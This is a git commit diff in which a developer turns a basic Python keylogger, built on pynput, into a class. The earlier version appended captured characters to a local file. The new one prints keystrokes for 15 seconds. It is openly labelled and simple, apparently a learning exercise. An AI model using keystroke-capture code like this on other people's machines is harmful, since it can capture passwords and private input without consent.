8cc28b481d1825a358cb2ffd2e9c3ed7048dd9dc
Tyler-Oreskey <toreskey@gmail.com>
2023-10-04 03:03:46 +0000

    keylogger is now class based

--- keylogger.py
+++ keylogger.py
@@ -1,17 +1,44 @@
 from pynput import keyboard
 
-def keyPressed(key):
-    print("hello")
-    print(str(key))
-    with open("./keyfile.txt", 'a') as logKey:
-        try:
-            char = key.char
-            logKey.write(char)
-        except:
-            print("Error getting char")
+# def keyPressed(key):
+#     print("hello")
+#     print(str(key))
+#     with open("./keyfile.txt", 'a') as logKey:
+#         try:
+#             char = key.char
+#             logKey.write(char)
+#         except:
+#             print("Error getting char")
     
 
-if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=keyPressed)
-    listener.start()
-    input()
+# if __name__ == "__main__":
+#     listener = keyboard.Listener(on_press=keyPressed)
+#     listener.start()
+#     input()
+
+import time
+
+class Keylogger:
+    def __init__(self):
+        self.key = ""
+        self.listener = None
+    
+    def start(self):
+        self.listener = keyboard.Listener(on_press=self.log)
+        self.listener.start()
+        print("listener started....")
+
+    def log(self, key):
+        print(key)
+
+    def stop(self):
+        print("listener stopped....")
+        self.listener.stop()
+        self.listener = None
+
+
+keylogger = Keylogger()
+keylogger.start()
+time.sleep(15)
+keylogger.stop()
+
